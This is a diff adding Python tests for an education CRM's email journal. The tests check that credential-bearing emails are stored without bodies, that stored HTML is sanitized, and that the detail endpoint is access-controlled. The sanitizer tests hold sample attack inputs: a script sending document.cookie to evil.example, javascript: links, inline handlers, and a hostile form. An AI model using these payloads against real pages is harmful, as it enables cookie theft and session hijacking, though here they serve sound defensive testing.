@@ -684,3 +684,218 @@ def test_log_api_rejects_an_unparseable_date(webhook_client):
         headers={"X-CRM-Service-Key": "test-service-key"},
     )
     assert response.status_code == 400
+
+
+# --- the content snapshot, and what must never be in it -----------------------------------
+
+
+PASSWORD = "Tr0ub4dor-Хвост-77"
+RESET_LINK = "https://lms.mastereducation.kz/reset?token=abcdef0123456789"
+
+
+def _send(sender, *, event_type, html, text=None, subject="Тема"):
+    sender.service.send_email(
+        ["someone@example.com"], subject, html, text, event_type=event_type
+    )
+
+
+def test_an_ordinary_email_keeps_a_readable_snapshot(journal, sender):
+    """"What did we actually send them?" is the second question anybody asks."""
+    _send(sender, event_type="homework_new",
+          html="<p>Новое задание по <b>алгебре</b></p>", text="Новое задание по алгебре")
+
+    [row] = rows(journal, event_type="homework_new")
+    assert row.content_withheld is False
+    assert "алгебре" in row.body_html
+    assert row.body_text == "Новое задание по алгебре"
+
+
+@pytest.mark.parametrize("event_type", sorted(email_log.NO_CONTENT_EVENT_TYPES))
+def test_a_credential_email_stores_no_body_at_all(journal, sender, event_type):
+    """Not "stored and hidden" — absent. A journal an admin can read is a journal an
+    attacker who reaches an admin account can read."""
+    _send(sender, event_type=event_type,
+          html=f"<p>Ваш пароль: {PASSWORD}</p><a href='{RESET_LINK}'>Сбросить</a>")
+
+    [row] = rows(journal, event_type=event_type)
+    assert row.content_withheld is True
+    assert row.body_html is None
+    assert row.body_text is None
+
+
+def test_password_reset_is_treated_as_credential_bearing(journal, sender):
+    """It carries no password, but a single-use reset link is a credential too.
+
+    `CREDENTIAL_EVENT_TYPES` deliberately excludes it — that set is about the provider's
+    echoed *error* text. Content storage needs the wider set.
+    """
+    assert "password_reset" not in email_log.CREDENTIAL_EVENT_TYPES
+    assert "password_reset" in email_log.NO_CONTENT_EVENT_TYPES
+
+    _send(sender, event_type="password_reset", html=f"<a href='{RESET_LINK}'>Сбросить</a>")
+
+    [row] = rows(journal, event_type="password_reset")
+    assert row.body_html is None
+    assert RESET_LINK not in (row.body_html or "") + (row.error or "")
+
+
+def test_no_credential_ever_reaches_the_database(journal, sender):
+    """The blunt end-to-end check: search every stored column for the secret."""
+    for event_type in sorted(email_log.NO_CONTENT_EVENT_TYPES):
+        _send(sender, event_type=event_type,
+              html=f"<p>{PASSWORD}</p><a href='{RESET_LINK}'>x</a>")
+
+    session = journal()
+    try:
+        for row in session.query(EmailLog).all():
+            haystack = " ".join(
+                str(v) for v in (row.body_html, row.body_text, row.error, row.subject) if v
+            )
+            assert PASSWORD not in haystack, f"{row.event_type} leaked a password"
+            assert RESET_LINK not in haystack, f"{row.event_type} leaked a reset link"
+    finally:
+        session.close()
+
+
+# --- the stored snapshot is inert ---------------------------------------------------------
+
+
+def test_script_is_stripped_before_the_row_is_written(journal, sender):
+    """Sanitized on the way *in*, so a future reader that forgets cannot be attacked."""
+    _send(sender, event_type="homework_new",
+          html="<p>Привет</p><script>fetch('https://evil.example/'+document.cookie)</script>")
+
+    [row] = rows(journal, event_type="homework_new")
+    assert "<script" not in row.body_html.lower()
+    assert "evil.example" not in row.body_html
+    assert "Привет" in row.body_html, "the readable part survives"
+
+
+def test_inline_handlers_and_javascript_urls_are_neutralised(journal, sender):
+    _send(sender, event_type="homework_new",
+          html="<a href=\"javascript:alert(1)\" onclick=\"steal()\">клик</a>")
+
+    [row] = rows(journal, event_type="homework_new")
+    assert "onclick" not in row.body_html.lower()
+    assert "javascript:" not in row.body_html.lower()
+    assert "клик" in row.body_html
+
+
+def test_forms_and_frames_do_not_survive(journal, sender):
+    _send(sender, event_type="lesson_change",
+          html="<form action='https://evil.example'><input name='p'></form>"
+               "<iframe src='https://evil.example'></iframe><p>Урок перенесён</p>")
+
+    [row] = rows(journal, event_type="lesson_change")
+    lowered = row.body_html.lower()
+    assert "<form" not in lowered and "<iframe" not in lowered
+    assert "Урок перенесён" in row.body_html
+
+
+def test_remote_images_are_defused_without_losing_the_layout(journal, sender):
+    """A tracking pixel must not fire every time an administrator opens the journal."""
+    _send(sender, event_type="curator_notify",
+          html="<img src='https://tracker.example/pixel.gif' alt='.'><p>Текст</p>")
+
+    [row] = rows(journal, event_type="curator_notify")
+    assert "tracker.example" not in row.body_html
+    assert "data-blocked-src" in row.body_html
+    assert "Текст" in row.body_html
+
+
+def test_strip_active_content_is_idempotent():
+    once = email_log.strip_active_content("<p>ok</p><script>x()</script>")
+    assert email_log.strip_active_content(once) == once
+
+
+def test_strip_active_content_handles_nothing_gracefully():
+    assert email_log.strip_active_content(None) is None
+    assert email_log.strip_active_content("") == ""
+
+
+# --- opening one row -----------------------------------------------------------------------
+
+
+#: The internal service key the `webhook_client` fixture configures.
+KEY_HEADERS = {"X-CRM-Service-Key": "test-service-key"}
+
+
+def test_the_detail_endpoint_requires_the_service_key(webhook_client):
+    assert webhook_client.get("/internal/email/log/1").status_code == 401
+
+
+def test_a_missing_row_is_a_404_not_an_empty_body(webhook_client, journal):
+    response = webhook_client.get("/internal/email/log/999999", headers=KEY_HEADERS)
+    assert response.status_code == 404
+
+
+def test_opening_an_ordinary_row_returns_the_body(webhook_client, journal):
+    row_id = email_log.claim(
+        event_type="homework_new",
+        recipient_email="student@example.com",
+        subject="Новое задание",
+        html_content="<p>Алгебра, до пятницы</p>",
+        text_content="Алгебра, до пятницы",
+    )
+
+    body = webhook_client.get(f"/internal/email/log/{row_id}", headers=KEY_HEADERS).json()
+
+    assert body["has_content"] is True
+    assert body["content_withheld"] is False
+    assert body["content_notice"] is None
+    assert "Алгебра" in body["body_html"]
+    assert body["body_text"] == "Алгебра, до пятницы"
+    assert body["recipient_email"] == "student@example.com"
+
+
+def test_opening_a_credential_row_returns_no_body_and_says_why(webhook_client, journal):
+    """The response must not carry the credential at all — not merely decline to render it."""
+    row_id = email_log.claim(
+        event_type="invite",
+        recipient_email="new@example.com",
+        subject="Приглашение",
+        html_content=f"<p>Пароль: {PASSWORD}</p>",
+        text_content=f"Пароль: {PASSWORD}",
+    )
+
+    body = webhook_client.get(f"/internal/email/log/{row_id}", headers=KEY_HEADERS).json()
+
+    assert body["content_withheld"] is True
+    assert body["body_html"] is None
+    assert body["body_text"] is None
+    assert body["has_content"] is False
+    assert "данные доступа" in body["content_notice"]
+    assert PASSWORD not in json.dumps(body, ensure_ascii=False)
+
+
+def test_a_historical_row_says_unavailable_rather_than_withheld(webhook_client, journal):
+    """Rows written before content capture. Nothing is hidden and nothing is invented —
+    "we chose not to store this" and "there was never anything here" are different answers."""
+    row_id = email_log.claim(
+        event_type="homework_new", recipient_email="old@example.com", subject="Старое"
+    )
+
+    body = webhook_client.get(f"/internal/email/log/{row_id}", headers=KEY_HEADERS).json()
+
+    assert body["content_withheld"] is False, "not a policy decision"
+    assert body["has_content"] is False, "and nothing to show"
+    assert body["content_notice"] is None
+
+
+def test_opening_a_row_never_sends_anything(webhook_client, journal, sender):
+    """A journal that re-delivers on read would be worse than no journal."""
+    row_id = email_log.claim(
+        event_type="homework_new", recipient_email="student@example.com",
+        subject="Тема", html_content="<p>Текст</p>",
+    )
+    before = rows(journal)[0]
+
+    for _ in range(3):
+        assert webhook_client.get(
+            f"/internal/email/log/{row_id}", headers=KEY_HEADERS
+        ).status_code == 200
+
+    assert sender.calls == [], "no HTTP call to the provider"
+    after = rows(journal)[0]
+    assert (after.status, after.attempts) == (before.status, before.attempts)
+    assert len(rows(journal)) == 1, "reading created no new row"
